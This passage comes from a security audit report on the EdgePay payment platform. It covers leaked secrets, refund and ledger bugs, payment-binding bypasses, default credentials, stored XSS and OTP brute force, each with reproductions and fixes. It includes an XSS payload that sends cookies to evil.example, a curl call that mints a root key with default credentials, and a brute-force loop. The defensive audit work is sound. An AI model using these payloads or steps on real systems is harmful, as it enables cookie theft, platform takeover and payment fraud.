**Affected files:** `scripts/verify-adversarial.mjs:3-5`, `scripts/verify-all-roles.mjs:4-5`, `scripts/verify-corroboration.mjs` (same constants), `wrangler.jsonc:51-52` (target), `EDGEPAY_AUDIT_REPORT.md` (no mention — the prior audit missed it)

**Observed behavior:**
Three verification scripts hardcode, as string literals:
- `API_KEY = 'op_live_9e9b…[REDACTED]'` — a full live-shaped merchant/platform API key,
- `JWT_SECRET = 'f14d…[REDACTED]'` — a 64-hex-character HS256 secret,
and point at `https://edgepay-cf.bm-jonybepary.workers.dev` — the same host declared as `APP_URL`/`APP_DOMAIN` in `wrangler.jsonc`, i.e. a real deployment of this exact code.

**Required invariant:** No reusable production credential may exist in source control (docs/SECURITY.md itself states API keys are "shown ONCE").

**Threat / failure scenario:**
1. Anyone who obtains this repository (it is public-facing — README carries a Deploy-to-Cloudflare badge and GitHub URLs) extracts the key and secret.
2. The `op_live_…` key authenticates against `/api/v1/*` and `/api/admin/v1/*` (scopes include `'*'` per the provisioning code path used to mint such keys).
3. The attacker: lists all merchants (`GET /api/admin/v1/merchants`), provisions new merchants and harvests their root keys (`POST /api/admin/v1/merchants` returns `api_key`, `webhook_secret`, `pairing_otp`), creates refunds on any completed transaction of the key's merchant, and triggers global reconciliation.
4. Independently, `JWT_SECRET` lets the attacker forge mobile-companion JWTs (`{sub, merchant_id, scope:['read','write']}`) for **any merchant**, pair-less, and inject SMS payment confirmations (`POST /api/mobile/v1/sms`) — combined with EDGE-P0-007's amount bypass this creates payments from thin air (§19 branch A1).

**Existing guard:** None. `.gitignore` excludes `.dev.vars` but not `scripts/*.mjs`. No secret-scanning CI.

**Why the guard is not sufficient:** n/a — the secret is directly committed; the single git commit contains it, so history rewriting is required to fully purge.

**Impact:** Full platform compromise — authentication bypass for an attacker-agnostic credential set; cross-tenant financial operations; forged payment confirmations.

**Exploitability:** High (no preconditions beyond repository access).

**Reproduction:** `rg -n "op_live_" scripts/` → three hits; `rg -n "JWT_SECRET" scripts/` → three hits; compare host with `wrangler.jsonc:51`.

**Recommended fix:**
1. **Rotate immediately:** `wrangler secret put JWT_SECRET` (new `openssl rand -hex 32`), revoke the exposed API key (`UPDATE op_api_keys SET status='revoked' WHERE key_prefix='9e9b…'`), rotate `APP_KEY`/`ENCRYPTION_KEY` after implementing versioned envelopes (EDGE-P2-010), and delete `KV system:root_api_key`.
2. Replace literals with `process.env.EDGEpay_KEY` / `process.env.JWT_SECRET` in all three scripts; fail fast when unset.
3. Add gitleaks/trufflehog to CI + a pre-commit hook; rewrite git history (the blob exists in the initial commit).

**Regression test:** CI step asserting `rg -n "op_live_[a-z0-9]{12}_" scripts/ src/ tests/` exits non-zero; unit test that scripts import secrets from env only.

**Verdict: FAIL**

---

## EDGE-P0-002 — Refund workflow reverses the wrong ledger transaction (ID-space confusion) and silently skips reversal when absent

**Severity:** P0 — Critical
**Confidence:** Confirmed (pure code trace; deterministic logic, no runtime needed)
**Category:** Financial / ledger correctness
**Affected files:** `src/workflows/refund-reconciliation.ts:183` (`ledger.reverse(refund.transaction_id, …)`), `:185-187` (error-string swallow), `src/services/ledger.ts:122-136` (`reverse()` expects an `op_ledger_transactions.id`), `src/services/refund.ts:57` (`transaction_id` is `op_transactions.id`)

**Observed behavior:**
`RefundReconciliationWorkflow.finalizeRefund` calls `ledger.reverse(refund.transaction_id, …)`. `refund.transaction_id` is the **payment** row id (`op_transactions.id`, set by `RefundService.createRefund` from `SELECT t.id … FROM op_transactions`). `LedgerService.reverse(ledgerTransactionId)` selects `FROM op_ledger_transactions WHERE id = ?` — a **different table with an independent AUTOINCREMENT sequence**. The id intended by the design was the ledger transaction created for the payment (whose `uuid` is the posting tx_id `m{merchant}:payment:{intentId}`), which must be resolved via `reference_type='payment' AND reference_id` or by tx_id — never by numeric id.

**Required invariant:** A refund must post a compensating (reversal) entry for **the ledger transaction of the refunded payment**, of the refund's amount, exactly once.

**Threat / failure scenario:**
- **Case A (numeric collision, common):** `op_ledger_transactions` has an autoincrement id that numerically equals the payment's `op_transactions.id` (both tables grow in lockstep roughly 1:1, so for a busy ledger roughly half of early refunds will collide). The workflow then reverses **an unrelated posting** in full: the wrong transaction's entries are inverted, the wrong account balances move, and `op_ledger_transactions.status` for that row flips to `'reversed'`. Trial balance stays balanced (reversals are balanced) but **account-level balances are corrupted**: e.g. a 5,000 BDT payment's "refund" posts a −10,000 reversal of some other payment.
- **Case B (no collision):** `reverse()` finds no row and throws `'Ledger transaction not found or already reversed'` (ledger.ts:139-141). `finalizeRefund` catches any error whose string contains `'already reversed'` (185-187) — the not-found message **contains that substring** — and treats it as success. The refund is marked `completed`, the refund webhook is dispatched, and **no reversal is ever posted**. Merchant books keep 100% of the revenue for money that was returned to the customer.
- **Case C (partial refund):** even when a valid row is found, the reversal posts the inverse of that row's **full** entries; `refund.amount` is only used for the gateway call and the webhook. A 30% partial refund reverses 100% of the payment.
- **Case D (second refund of the same payment):** `reverse()` throws "already reversed" (status now 'reversed') → swallowed → refund #2 completes with no additional reversal, while the gateway may have refunded money twice (nothing bounds cumulative refunds — see EDGE-P0-003).

**Existing guard:** the reversal's own idempotency key (`m{merchant}:reversal:{uuid}`) prevents double-posting of the (wrong) reversal; the workflow's replay guard returns early if the refund row is already terminal. None of these address the wrong-key problem.

**Why the guard is not sufficient:** the guards protect against *repeating* the incorrect action, not against *performing* the incorrect action. The error-string match is additionally fragile: any future error message containing "already reversed" is silently swallowed.

**Impact:** Ledger corruption (Case A) and systematic revenue overstatement after refunds (Case B); customer money returned without book adjustment; reconciliation drift pages will fire for Case A (balances move vs mirror — actually the mirror is written by the same reversal path, so DO and mirror stay consistent while *both* diverge from business truth — drift detection is bypassed).

**Exploitability:** Medium (requires no attacker — every refund triggers it; an attacker can amplify via EDGE-P0-003's unbounded refunds).

**Reproduction (reasoned, deterministic):** complete a payment (ledger tx id ≠ payment tx id in general); create an admin refund; run the workflow; observe either (a) an unrelated `op_ledger_transactions` row becomes `reversed` with inverse entries, or (b) no new ledger transaction is created and the refund completes.

**Recommended fix:**
1. Resolve the ledger transaction by posting key: `SELECT id FROM op_ledger_transactions WHERE uuid = 'm' || merchant_id || ':payment:' || (SELECT payment_intent_id FROM op_transactions WHERE id = ?)` — or better, store `ledger_transaction_id` on `op_refunds` at refund creation (already returned by `postPaymentLedgerEntry`).
2. Replace the string-matching swallow with a typed result: `reverse()` returns `{status:'reversed'|'not_found'|'posted'}`; only `not_found` for an *actually previously reversed* row may no-op.
3. Post the reversal for the **refund amount**, constructing fresh balanced entries (debit revenue / credit clearing for the refund amount), not the inverse of the original row — this also fixes partial refunds and enables multiple bounded refunds (with a cumulative check).

**Regression test:** end-to-end: payment → refund(50%) → assert exactly one new `op_ledger_transactions` row with `reference_type='refund'`, entries equal to the refund amount, original payment's ledger row still `posted`; refund(60%) again → cumulative check rejects when remaining < 60%; refund of a payment whose ledger tx id numerically equals another transaction's id → only the correct row reverses.

**Verdict: FAIL**

---

## EDGE-P0-003 — Merchant-API refund path: unbounded refunds, no ledger reversal, immediate "completed"

**Severity:** P0 — Critical
**Confidence:** Confirmed (code trace; the route handler is self-contained)
**Category:** Financial / refund integrity
**Affected files:** `src/controllers/api.ts:147-256` (POST /api/v1/refunds), `src/lib/validation.ts:47-54` (`createRefundSchema` — amount optional, unbounded)

**Observed behavior:**
`POST /api/v1/refunds` (merchant API, `requireScope('write')`, idempotency required):
1. Loads the transaction (`WHERE trx_id = ? AND merchant_id = ?`) — tenant-scoped, good.
2. Requires `tx.status === 'completed'` — good.
3. `refundAmount = body.amount ?? tx.amount` — **no check that `refundAmount ≤ tx.amount`** and **no cumulative check against prior refunds**.
4. Calls `adapter.refund(...)` — for manual gateways the base class returns `{success:false, error:'refund_not_supported'}` and the route 502s; for API gateways (Stripe/PayPal/Razorpay) a real refund is issued.
5. On success, inserts `op_refunds (… status='completed' …)` — **no ledger reversal, no workflow instance, no cumulative accounting.** The response reports `status:'completed'`.

**Required invariant:** refund ≤ captured minus already-refunded; every refund has exactly one ledger compensating entry; refund settlement is observed (workflow) before being reported complete.

**Threat / failure scenario:**
Merchant API key (or the leaked key, or a read-scoped key is not enough but write is trivially held by the leaked '*'-scoped key) issues:
- refund 100,000 of a 1,000 payment → gateway may reject (provider-side limit) or, where the provider permits partial-over-refund, money is returned beyond capture;
- refunds 1,000 × 5 times on the same 1,000 transaction → five provider refunds + five `op_refunds` rows, each 'completed', zero ledger effect. Depending on provider semantics this is either double spend (provider allows) or a bookkeeping lie (provider rejects but route 502s only after the fact).
Even in the benign single-refund case, the ledger keeps the full revenue posting while the customer was repaid — the books are wrong after **every** API-path refund.

**Existing guard:** status must be `completed`; idempotency key required (prevents accidental duplicate *requests*, not distinct over-refunds); ENABLED_GATEWAYS gate.

**Why the guard is not sufficient:** none of the guards bound the amount, accumulate prior refunds, or touch the ledger. The route duplicates RefundService logic (two divergent refund paths — an architecture smell the prior audit's "one place refunds are created" claim contradicts).

**Impact:** Money loss (over/duplicate refunds where the provider permits); systematic ledger-revenue overstatement; irreconcilable books.

**Exploitability:** High for any holder of a write-scoped key (and the leaked key qualifies).

**Reproduction:** `POST /api/v1/refunds {"transaction_id":"op_…","amount":"99999999.99","reason":"x"}` with `X-Idempotency-Key` on a completed transaction → 201 with `status:'completed'` (for a gateway whose refund call succeeds) or 502 REFUND_FAILED (provider-rejected) — no 422 for amount > captured either way; `SELECT * FROM op_ledger_transactions WHERE reference_type='refund'` → empty.

**Recommended fix:** delete the inline path; route the handler through `RefundService.createRefund` (after fixing EDGE-P0-002), enforce `amount ≤ tx.amount − Σ(prior non-failed refunds)` in SQL, reject with 422 REFUND_EXCEEDS_CAPTURE, and never mark `completed` inline (workflow owns terminal status).

**Regression test:** over-refund → 422; second refund exceeding remainder → 422; successful refund → `op_refunds.status='pending'`, workflow instance exists, ledger reversal posted for refund amount, webhook `refund.completed` only after workflow finalize.

**Verdict: FAIL**

---

## EDGE-P0-004 — Redirect-callback completion ignores amount and intent binding (paymentID / val_id substitution)

**Severity:** P0 — Critical
**Confidence:** Confirmed (code trace + adapter reads)
**Category:** Financial / payment integrity
**Affected files:** `src/services/payment.ts:271-324` (`handleCallback` — discards `verifyResult.amount` and `verifyResult.trx_id`), `src/controllers/checkout.ts:257-273` (callback passes attacker-controlled query params), `src/gateways/bkash/bkash.gateway.ts:117-165` (verify executes caller-supplied `paymentID`), `src/gateways/sslcommerz/sslcommerz.gateway.ts:90-146` (verify validates caller-supplied `val_id`, returns `tran_id` that is never compared)

**Observed behavior:**
`GET /checkout/{token}/callback?paymentID=…` (bKash) or `?val_id=…` (SSLCommerz) resolves the intent by **token** and then calls `adapter.verify(callbackData, credentials)`. The adapter operates on the **customer-supplied identifier**:
- bKash: `POST /tokenized/checkout/execute {paymentID}` — executes whatever payment session the id refers to; success = `statusCode '0000' && transactionStatus 'Completed'`; returns `amount` (the executed payment's amount).
- SSLCommerz: `GET validationserverAPI?val_id=…` — validates any validation id of the store; returns `amount` and `tran_id` (the merchant order id EdgePay set at initiate = our `trx_id`).

`handleCallback` then calls `completeTransaction(intent.trx_db_id, intent.id, verifyResult.gateway_trx_id)` — the completion posts **`tx.amount` from the DB** (the intent's amount) and ignores `verifyResult.amount` entirely. `verifyResult.trx_id` is likewise never compared to `intent.trx_id` — the one field that would bind the confirmation to this intent.

**Required invariant:** a payment may be completed only by a gateway confirmation that (a) references this intent's order id and (b) carries an amount equal to the intent's amount.

**Threat / failure scenario (customer-side fraud, no key theft needed):**
1. Attacker starts checkout for intent B (100,000 BDT) on the merchant's store and separately completes a genuine tiny payment intent A (10 BDT) of their own at the same merchant/gateway.
2. bKash case: attacker navigates to `/checkout/{tokenB}/callback?paymentID={paymentId_of_A}` (the callback URL is predictable: `${APP_URL}/checkout/{token}/callback` from initiate). EdgePay executes paymentID-A — real 10 BDT money moves to the merchant — verification succeeds (`0000/Completed`).
3. `completeTransaction(B)` runs: ledger posts **100,000** to the merchant's books, transaction+intent B flip to `completed`, merchant receives `payment.completed` for 100,000, ships goods worth 100,000. Actual money received: 10.
4. SSLCommerz case: identical with `val_id` from the small payment; even the returned `tran_id` (which equals intent A's trx_id) is ignored, so no binding check fires.

**Existing guard:** the checkout token is unguessable (64 hex) — but the attacker holds token B legitimately (it is their own checkout session); the token protects third parties, not the payer. Gateway-side verification proves *a* payment happened, not *this* payment.

**Why the guard is not sufficient:** verification authenticates the supplied provider id, not its binding to the intent; the amount field that would catch the mismatch is explicitly discarded at the service layer.

**Impact:** Merchants ship goods/services for payments that never occurred (amount manipulation / transaction substitution — two of the briefs' named payment threats).

**Exploitability:** High for any customer of a merchant using bKash-API or SSLCommerz redirect flows (the primary BD gateways this product targets).

**Reproduction (local dev):** complete a sandbox payment; capture `paymentID`; open a second, larger intent's callback URL with that id; observe completion of the larger intent (ledger posts the larger amount).

**Recommended fix (service-layer, adapter-agnostic):**
```ts
if (verifyResult.amount != null && cmp(verifyResult.amount, intent.amount) !== 0)
  throw new ValidationError('AMOUNT_MISMATCH');           // fail closed
if (verifyResult.trx_id && verifyResult.trx_id !== intent.trx_id)
  throw new ValidationError('ORDER_ID_MISMATCH');         // binding check
```
Apply in `handleCallback` (and mirror in the webhook completion path). Additionally, for bKash, persist `session_id`/`paymentID` at initiate time and only accept callbacks whose id matches the stored one.

**Regression test:** callback with a valid-but-foreign paymentID/val_id and mismatched amount → 400/422, transaction remains `processing`, ledger untouched; callback with matching amount and order id → completes.

**Verdict: FAIL**

---

## EDGE-P0-005 — Bootstrap default-credential chain mints a root platform key with known values

**Severity:** P0 — Critical (deployment security)
**Confidence:** Confirmed (code trace; chain is deterministic on a fresh deploy)
**Category:** Secrets / bootstrap / install
**Affected files:** `src/services/bootstrap.ts:37-40` (defaults `admin@edgepay.internal`, phone, OTP `'123456'`), `:68` (`hashPassword('AdminPass123456!')`), `:225` (`KV.put('system:root_api_key', …)`), `:228-229` (bootstrap flags), `src/index.ts:83-108` (auto-bootstrap on any request when KV flag absent), `src/controllers/install.ts:269-317` (`/install/bootstrap-key` exchanges email+password for a new `'*'` key with **no install-lock**), `src/middleware/rate-limit.ts:37` (install group = **120 req/60s**, not the 3/hour the comments claim)

**Observed behavior:**
On a fresh deployment (Deploy-to-Cloudflare button provisions empty D1+KV), the first request triggers `ensureSystemBootstrapped`:
- platform merchant `EdgePay Platform` (is_platform=1);
- platform admin user `admin@edgepay.internal` with **PBKDF2 hash of the literal `AdminPass123456!`**;
- device-pairing OTP **`123456`** valid 30 days;
- a root `op_live_…` key with scopes `['read','write','admin','*']`, also written **in plaintext** to KV `system:root_api_key`;
- KV `system:bootstrapped`/`system:installed` = 'true'.

`POST /install/bootstrap-key` then accepts `admin_email`+`admin_password` — no install-lock, no lockout, and an effective per-IP budget of 120/min (the mounted `perIpRateLimit('install')` group config) — and mints **another** `'*'`-scoped key.

**Required invariant:** no production environment may contain a usable credential whose value is knowable from public source code.

**Threat / failure scenario:**
1. Attacker requests any URL of a fresh deployment (or one whose KV lost the `system:bootstrapped` key — bootstrap re-runs and re-seeds any missing piece, including re-adding the default-OTP row if deleted).
2. `POST /install/bootstrap-key {admin_email:'admin@edgepay.internal', admin_password:'AdminPass123456!'}` → 200 + fresh root key (OTP brute-force is unnecessary; the pairing OTP `123456` additionally grants SMS-injection authority — §19 branch A3).
3. Root key → list/provision merchants, harvest new tenants' keys/secrets (EDGE-P1-005), trigger refunds/reconciliation.

**Existing guard:** `/install` POST itself is locked after install (`system:installed`), and `bootstrap-key` requires valid credentials — but the credentials are the published defaults. Nothing forces rotation; no alarm fires when the default password authenticates.

**Why the guard is not sufficient:** the gate defends the door with the key that is taped to the door. KV-as-lock is also non-transactional: two concurrent installs can both pass the `installed` check (race) — secondary issue.

**Impact:** Full platform takeover of any deployment that has not manually rotated the bootstrap credentials.

**Exploitability:** High for default deployments; Low after full rotation (but nothing enforces rotation).

**Reproduction:** fresh `wrangler dev` with empty KV/D1 → first request bootstraps → `curl -X POST /install/bootstrap-key -d '{"admin_email":"admin@edgepay.internal","admin_password":"AdminPass123456!"}'` → 200 + api_key.

**Recommended fix:**
1. Generate the admin password and OTP from `crypto.getRandomValues`, return them **once** in the install-wizard response, never store plaintext; delete `system:root_api_key` from KV (it is unreferenced by any auth path — pure exposure).
2. Gate `/install/bootstrap-key` on `system:installed != 'true'` **or** remove the endpoint entirely (the wizard already returns a key); add failed-attempt lockout (KV counter keyed by email+IP, 5 attempts/hour) and a `page()` on every default-credential login success.
3. Set the install limiter to the documented 3/hour/IP (`ANON_ROUTE_LIMITS['install'] = {windowSec:3600, maxRequests:3}`) and mount the existing `otp`/`password` groups on `/api/mobile/v1/pair|refresh` and any future login route.
4. Add a startup self-check: if `verifyPassword('AdminPass123456!', adminRow.password_hash)` succeeds for any user, `page('DEFAULT_CREDENTIAL_ACTIVE')` and refuse admin API access.

**Regression test:** fresh-env integration: bootstrap runs → `POST /install/bootstrap-key` with the literal default password → 401 (password is random); OTP is 6 random digits ≠ '123456'; no `system:root_api_key` KV entry exists; install limiter 429s the 4th attempt within the hour.

**Verdict: FAIL**

---

## EDGE-P0-006 — Checkout page: stored XSS via merchant brand color and gateway fields, with no CSP on HTML routes

**Severity:** P0 — Critical (P1 by exploit preconditions — merchant-controlled input; elevated to P0 because the checkout page is the platform's payment surface and runs on the platform origin for default deployments)
**Confidence:** Confirmed (template inspection; escapeHtml provably does not escape single quotes; brandColor provably unescaped; CSP provably unmounted for HTML routes)
**Category:** XSS / CSP
**Affected files:** `src/controllers/checkout.ts:62` (`merchant?.color` used raw), `:321` (`--primary: ${opts.brandColor};` inside `<style>`), `:598` & `:665` (single-quoted JS string args in `onclick` built with `escapeHtml(...)`, which escapes `& < > "` but **not `'`** — checkout.ts:754-760), `:601,613` (amount/currency escaped correctly — for contrast), `src/index.ts:160-161` (nonce-CSP only on `/api/*`,`/webhook/*`), `src/middleware/security-headers.ts` (exists but never applied to HTML), prior-audit claim `sanitizeBrandColor ^#[0-9a-fA-F]{6}$` (absent in the tree)

**Observed behavior:**
The checkout template interpolates:
1. `brandColor` into the CSS `<style>` block **without any validation or escaping** — the documented `sanitizeBrandColor` from the prior audit does not exist in the current file;
2. `account_number` and `instructions` (merchant-settable via gateway config/manual-gateway rows) into **single-quoted JavaScript string literals inside `onclick` attributes** (`selectGateway(this, id, '…account…', '…instructions…', '…type…')`), where `escapeHtml`'s lack of `'`-escaping allows breaking out of the JS string and executing arbitrary script;
3. the first gateway's fields again in the inline init call at line 664-665.

**Required invariant:** all merchant-controlled values must be escaped for their exact output context (CSS, JS-string-in-attribute), and the page must ship a CSP that blocks inline script injection.

**Threat / failure scenario:**
A malicious (or compromised) merchant sets:
- `color = "</style><script>fetch('https://evil.example/?c='+document.cookie)</script>"` → the `</style>` closes the style element, and the `<script>` executes in the checkout page on the platform origin. On default deployments, checkout URLs live on the platform's `workers.dev`/custom host — session/CSRF cookies of any platform-admin browsing a merchant's checkout are exposed, and the payment page can be defaced (change the payee amount display, intercept the TrxID the customer types, redirect the "Pay" flow to a phishing gateway).
- `account_number = "', 'x', 'y'); alert(document.domain); ('"` → single-quote breakout inside the onclick → script execution on every gateway selection.
Because checkout is token-addressed and merchants share the platform origin, this is **stored XSS executed against customers and platform staff** — the platform's "safe hosted checkout" promise is void.

**Existing guard:** `escapeHtml` for HTML text contexts (title, description, amount, gateway name — correctly escaped); Hono `c.html`; no CSP on HTML routes at all (the nonce-CSP middleware is deliberately not mounted because the template uses inline scripts — the code comment admits the follow-up was never done).

**Why the guard is not sufficient:** HTML-escaping does not protect CSS or JS-string contexts; the missing single-quote escape is a textbook attribute-context bug; with no CSP there is no second line of defense.

**Impact:** Script execution on the payment page (session theft, defacement, customer-data capture — customers type their mobile numbers and TrxIDs here).

**Exploitability:** Medium (requires merchant admin access or a compromised merchant account — the platform's threat model explicitly includes hostile tenants).

**Reproduction:** set a merchant's `color` to the payload above (via whatever admin path writes `op_merchants.color`) → `GET /checkout/{token}` → the injected script executes; or set a manual gateway `account_number` containing `'` + JS and click any gateway option.

**Recommended fix:**
1. Add `sanitizeBrandColor(v): v?.trim().match(/^#[0-9a-fA-F]{6}$/) ? v : '#0052cc'` and use it at checkout.ts:62.
2. Replace the inline `onclick` string-building with `data-*` attributes + one `addEventListener` (or JSON-encode args into a `data-gw` attribute and parse with `JSON.parse`) — eliminating JS-string contexts entirely.
3. Mount `securityHeadersMiddleware` on HTML routes after threading per-request nonces through the template's inline scripts (`<script nonce="…">`), i.e. finish the tracked follow-up; keep `frame-ancestors 'none'` + `form-action 'self'`.

**Regression test:** render checkout with adversarial color/account_number/instructions; assert output contains no `</style><script`, no unescaped `'` inside attribute JS, and that a CSP header with a nonce is present; DOM-level assertion (happy-dom/jsdom) that no script executes from the payloads.

**Verdict: FAIL**

---

## EDGE-P0-007 — SMS-corroborated completion skips the amount check when `parsed_amount` is NULL and accepts `no_match` SMS

**Severity:** P0 — Critical
**Confidence:** Confirmed (code trace of the exact conditional; data flow from consumer to checkout verified)
**Category:** Financial / SMS payment confirmation
**Affected files:** `src/controllers/checkout.ts:166-178` (SMS match query includes `match_status IN ('pending','parsed','needs_manual_review','no_match')`), `:180-191` (`if (matchingSms.parsed_amount && cmp(...) !== 0)` — amount check only when parsed_amount is truthy), `src/queues/sms-consumer.ts:63-79` (parsed values are written **before** the `parser === 'none'` branch re-marks the row `no_match`, so a no-amount SMS lands with `parsed_trx_id` set and `parsed_amount NULL`), `src/services/sms-parser.ts:132-139` (heuristic returns `amount:null, trx_id` when no amount matches)

**Observed behavior:**
When a customer submits a TrxID, the server looks for an SMS row for that merchant with the same `parsed_trx_id` — **including rows in `no_match` status** — and if found:
```ts
if (matchingSms.parsed_amount && cmp(matchingSms.parsed_amount, intent.amount) !== 0) → AMOUNT_MISMATCH
```
When `parsed_amount` is NULL (parser found a TrxID but no valid amount — exactly what `extractFallbackHeuristic` produces for format drift, and what the consumer persists before its `no_match` re-mark), **the guard short-circuits and the payment completes with only a TrxID match** — no amount verification at all. The completion then posts the intent's full amount to the ledger.

**Required invariant (from the briefs' SMS section):** parse → validate → corroborate (exact `cmp()==0`) → tenant match → transaction match → window match → idempotency → ledger post. The amount leg is mandatory.

**Threat / failure scenario A (no attacker):** an MFS SMS format drift (new template, Bengali-numeral variant the templates miss, truncated message) yields TrxID-without-amount; a customer who paid 500 against a 5,000 intent submits the 500-payment's TrxID; the intent completes at 5,000. Merchant ships 5,000 of goods for 500.
**Scenario B (attacker with pairing compromise — §19 branch A3):** attacker pairs a device (default OTP `123456`, brute-forceable 6-digit OTP with **no rate limit** on `/api/mobile/v1/pair` — EDGE-P1-002 — or forged JWT via the leaked secret) and POSTs a crafted SMS: `"Payment successful. TrxID: <victim-submitted-id>"` with no amount; the parser's heuristic returns `amount:null, trx_id` → row stored `no_match` with the TrxID; the attacker (as the customer) submits that TrxID against their own high-value intent → completes with zero amount evidence. The corroboration gate in `corroborateSmsPayment` (which properly requires exact amount) is **bypassed entirely** because this path completes from the checkout handler, not through the queue consumer.

**Existing guard:** the TrxID-already-used check (149-163) prevents reusing a TrxID across completed intents; the intent-status `completed` early-return; the SMS path *within the consumer* uses the strict corroboration gate (this is the checkout-side hole).

**Why the guard is not sufficient:** truthiness of `parsed_amount` converts "no evidence" into "pass"; `no_match` inclusion converts "the parser rejected this SMS" into "usable evidence"; the checkout path duplicates, and weakens, the consumer's corroboration logic instead of sharing it.

**Impact:** Payments completed at the intent's amount with a real payment of any smaller amount (or none) behind them — money created on the books.

**Exploitability:** Medium standalone (needs SMS-format drift); High when chained with the pairing weakness.

**Reproduction:** insert an `op_sms_data` row for merchant M with `parsed_trx_id='ABCD1234', parsed_amount=NULL, match_status='no_match'`; create intent of 99999.00 for M; `POST /checkout/{token}/verify {"trx_id":"abcd1234"}` → `status:'completed'`; ledger posts 99999.00.

**Recommended fix:**
1. Make the amount check mandatory: `if (!matchingSms.parsed_amount || cmp(matchingSms.parsed_amount, intent.amount) !== 0) → 400 AMOUNT_NOT_VERIFIED` (fail closed on missing evidence).
2. Restrict the query to `match_status IN ('parsed','needs_manual_review')` — never `no_match`/`pending` (pending rows have no parsed fields at all).
3. Delete the duplicated decision logic: route the checkout submission through `corroborateSmsPayment` (single gate), or persist a pending "customer-claimed" record and let the consumer confirm.
4. Pair with EDGE-P1-002 (rate limit + lockout + crypto-random OTPs) so the SMS source itself is not attacker-writable.

**Regression test:** the reproduction above must yield 400 and no ledger row; an SMS with a *different* amount must yield AMOUNT_MISMATCH (existing behavior, keep); an SMS with equal amount completes (existing behavior, keep).

**Verdict: FAIL**


---

# 11. Findings — P1 High

---

## EDGE-P1-001 — Idempotency is not concurrency-safe and keys are not endpoint-scoped

**Severity:** P1
**Confidence:** Confirmed (middleware read; race is structural)
**Category:** Idempotency / concurrency
**File:** `src/middleware/idempotency.ts:42-179`

**Observed behavior:** the middleware (a) looks up an existing record, (b) if absent, runs the handler, (c) caches the response **afterwards** via `c.executionCtx.waitUntil(INSERT … ON CONFLICT DO NOTHING)` (163-177). Two concurrent requests with the same key both see "no existing record" and both execute the full handler; the insert race is survived (one row wins) but **the side effect has already happened twice**. Additionally the cache key is `(merchant_id, key)` only — no endpoint/path component — so the same key reused on `/payments` and `/refunds` replays the payments response for the refunds call (cross-endpoint collision). TTL 24h; 4xx not cached (correct); expired rows deleted synchronously before reprocess (correct, but the delete-then-process window is itself racy).

**Required invariant:** same key + same payload under concurrency ⇒ exactly one side effect; key identity must include the endpoint.

**Threat / failure scenario:** a payment client's timeout-retry storm (or a deliberate parallel fan-out of 20 requests with one key — the brief's exact test) creates 20 payment intents, 20 rows in `op_transactions`, and 20 checkout tokens; a refund retried concurrently issues two provider refunds (double money movement for gateways lacking provider-side idempotency).

**Existing guard:** `UNIQUE(merchant_id,key)` prevents duplicate cache rows; ledger-level dedup (payment completion) is the real backstop for *completion*, not for *creation* or gateway side effects.

**Why insufficient:** uniqueness of the cache row does not serialize execution; the backstop only exists on one path.

**Impact:** duplicate payment creation (confusion + downstream retries), duplicate gateway refunds (money), duplicate webhook registrations.

**Exploitability:** Medium (needs concurrent duplicates — automatic for retrying clients).

**Reproduction:** 20 parallel `POST /api/v1/payments` with one key + one body → observe 20 intents created (`SELECT COUNT(*) FROM op_payment_intents WHERE …`) while the API returns 20 different 201s.

**Recommended fix:** reserve-then-execute: first `INSERT INTO op_idempotency_keys (…status='in_progress', request_body_hash…) ON CONFLICT DO NOTHING`; if `changes==0`, poll/return 409-in-flight or the cached response once the winner finishes (store the response on completion). Add `endpoint` (or method+path hash) to the key composite and to the UNIQUE index via migration; keep TTL cleanup.

**Regression test:** 20-parallel same-key test asserting exactly one intent row and identical response bodies for all callers; same key on `/refunds` with a different body → 409.

**Verdict: FAIL**

---

## EDGE-P1-002 — Mobile pairing OTP is brute-forceable: no rate limit, no lockout, weak RNG; default OTP shipped

**Severity:** P1 (P0 when chained — see EDGE-P0-005/007)
**Confidence:** Confirmed
**Category:** Authentication / SMS injection authority
**Files:** `src/controllers/mobile.ts:18-94` (pairing), `src/middleware/rate-limit.ts:33-40` (`otp`/`password` groups **defined but never mounted**), `src/controllers/admin-api.ts:376` (`Math.random()` OTP), `src/services/bootstrap.ts:39` (`'123456'`)

**Observed behavior:** `POST /api/mobile/v1/pair` looks up `op_device_pairing_tokens WHERE token = ? AND used_at IS NULL` — a 6-digit numeric OTP. There is **no rate limiting on any `/api/mobile/v1/*` route** (the only mounted per-IP limiter is on `/install*`; the per-key native limiter requires a bearer key that pairing callers don't have). Provisioned OTPs use `Math.random()` (non-cryptographic). Bootstrap/install seed the literal `123456`. A successful pair issues access+refresh JWTs carrying `merchant_id` and `scope:['read','write']`.

**Threat / failure scenario:** an attacker brute-forces the 6-digit space against a target merchant: unthrottled (only Workers' own throughput limits), ~10^6 attempts; D1 read per attempt. With the default OTP still active (fresh deploy or un-rotated), a single request suffices. The resulting JWT authorizes `POST /api/mobile/v1/sms` — the SMS-injection channel that feeds EDGE-P0-007's bypass.

**Existing guard:** OTP single-use (`used_at`), 30-day expiry, 6-digit format check. Nothing throttles attempts.

**Why insufficient:** single-use does not resist guessing when guessing is free.

**Impact:** payment-confirmation forgery authority for any merchant (paired device = trusted SMS source).

**Exploitability:** High (no auth prerequisites).

**Reproduction:** loop `POST /api/mobile/v1/pair {"otp":"<n>"}` — no 429s ever; correct guess returns tokens.

**Recommended fix:** mount `perIpRateLimit('otp')` on pair/refresh; add per-token attempt counters with lockout (5 strikes → revoke the token row); generate OTPs with `crypto.getRandomValues`; alert on 3+ failures; force rotation of seeded defaults (EDGE-P0-005 fix covers the default).

**Regression test:** 6th pairing attempt with wrong OTP in the hour → 429; correct OTP after lockout → 410; `Math.random` absence verified by pinning an injected crypto mock.

**Verdict: FAIL**

---

## EDGE-P1-003 — Inbound webhook: no body-size cap, non-deterministic event ids, fail-open geo layer

**Severity:** P1
**Confidence:** Confirmed (all three sub-claims verified against code; prior audit claimed all three were fixed — §22)
**Category:** Webhook security / DoS / replay
**File:** `src/controllers/webhooks.ts:100-198`

**Observed behavior:**
1. `const rawBody = await c.req.text()` (131) — **no `Content-Length` check, no byte cap**; signature verification hashes arbitrary-size bodies (CPU), and after verification the raw body is stored in `op_webhook_events.payload` unbounded (176-189). Workers' platform limit (~100 MB) is the only ceiling.
2. `event_id = payload.id ?? payload.event_id ?? crypto.randomUUID()` (159) — when the provider omits an id, every redelivery generates a **fresh** UUID, so the `UNIQUE(merchant_id,gateway,event_id)` dedup never fires; the delivery is fully reprocessed (ledger-safe via dedup, but the outbound merchant webhook is re-dispatched and duplicate event rows accumulate).
